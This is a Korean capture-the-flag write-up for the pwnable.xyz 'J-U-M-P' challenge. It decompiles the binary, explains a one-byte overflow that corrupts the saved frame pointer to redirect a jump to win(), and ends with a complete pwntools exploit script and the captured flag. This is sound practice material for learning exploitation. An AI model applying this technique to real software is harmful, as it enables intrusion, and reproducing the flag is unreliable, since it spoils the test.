# [pwnable.xyz] J-U-M-P

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Jump around
>
> Release: [J-U-M-P.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8951521/J-U-M-P.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/174868407-fdb939e1-e705-4ce9-b11e-cf352cf99d8e.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `gen_canary()`

```c
__int64 gen_canary()
{
  int fd; // [rsp+Ch] [rbp-4h]

  fd = open("/dev/urandom", 0);
  if ( fd == -1 )
  {
    puts("Can't open /dev/urandom.");
    exit(1);
  }
  if ( read(fd, &canary, 8uLL) != 8 )
  {
    puts("Can't read data.");
    exit(1);
  }
  close(fd);
  return canary;
}
```

바이너리 자체에는 canary 보호기법이 적용되어 있지 않은데, 실행 중에 `gen_canary()` 함수로 canary를 만들어서 사용한다. `/dev/random`으로부터 8바이트 랜덤 값을 읽어와서 전역 변수 `canary`에 저장한다.

### `main()`

```c
  stackCanary = gen_canary();
  puts("Jump jump\nThe Mac Dad will make you jump jump\nDaddy Mac will make you jump jump\nThe Daddy makes you J-U-M-P\n");
  jump = &loc_BA0;
```

먼저 `gen_canary()`로 canary를 생성한다.

`jump`는 `1. J-U-M-P`를 선택했을 때 점프할 주소를 담고 있다. 초기값은 `0xba0`(`main+22`)로 설정된다.

#### 1. J-U-M-P

```c
      case 1u:
        if ( stackCanary == canary )
          __asm { jmp     rax }
        break;
```

![image](https://user-images.githubusercontent.com/104156058/174944216-55e287b2-aa45-47d0-a86f-7866f6048b7c.png)

처음에 생성한 `stackCanary()`가 변조되지 않았다면 `rbp-0x8`에 있는 값(`jump`)을 `rax`에 넣고 그 주소로 점프한다.

#### 2. How high

```c
      case 2u:
        jump = (void *)(int)((unsigned int)jump ^ op);
        break;
```

`jump`의 값을 `op`와 xor하는데, `int`로 형변환이 되기 때문에 한 번 이 과정을 거치면 하위 4바이트만 남게 된다.

#### 3. Ya you know me

```c
      case 3u:
        argv = (const char **)environ;
        printf("%p\n", (const void *)environ);
        break;
```

`environ`의 값을 출력해준다. 이를 이용하여 스택의 주소를 계산할 수 있다.

## Exploit

```c
int read_int8()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  read(0, buf, 0x21uLL);
  return atoi(buf);
}
```

`op`를 입력받을 때 사용하는 `read_int8()` 함수에서 1바이트만큼 BOF가 발생한다. 이를 이용하여 SFP의 마지막 1바이트를 원하는 값으로 덮어쓸 수 있다. 이 변조된 값은 `main()`의 `rbp`가 된다.

![image](https://user-images.githubusercontent.com/104156058/175831370-4b53bd14-4547-4a07-9e7d-39634b97412e.png)

`read_int8()`의 반환값은 `rbp-0x11`에 들어간다. `rbp`를 변조할 수 있기 때문에, 결과적으로 스택의 1바이트를 원하는 값으로 덮어쓸 수 있게 된다.

![image](https://user-images.githubusercontent.com/104156058/175831543-2f33a0c0-d694-4aaa-99cc-d01a493396ad.png)

`rsp+0x38`에 있는 값의 하위 1바이트를 `0x77`로 덮어쓰면 `win()`의 주소가 된다(실제로는 `win+0`으로 점프하면 스택 정렬 문제가 있어서, `win+4`로 점프하도록 `0x7b`로 덮어썼다).

덮어쓰고 나서 `rbp`를 원래대로 복구하고 `1. J-U-M-P`를 실행하면 `win()`으로 점프하여 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30012)

sla = r.sendlineafter
sa = r.sendafter


# stack leak

sla('> ', '3')

r.recvuntil('0x')
rbp = int(r.recvline()[:-1], 16) - 0xf8 # rbp of main()
log.info('rbp of main(): ' + hex(rbp))


# jump to win()

sa('> ', str(0x7b).ljust(0x20, 'A') + chr((rbp & 0xff) + 0x9))
sa('> ', str(1).ljust(0x20, 'A') + chr(rbp & 0xff))


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30012: Done
[*] rbp of main(): 0x7ffc80ef46a0
[*] Switching to interactive mode
FLAG{jumping_the_stack_pointer_is_fun}
```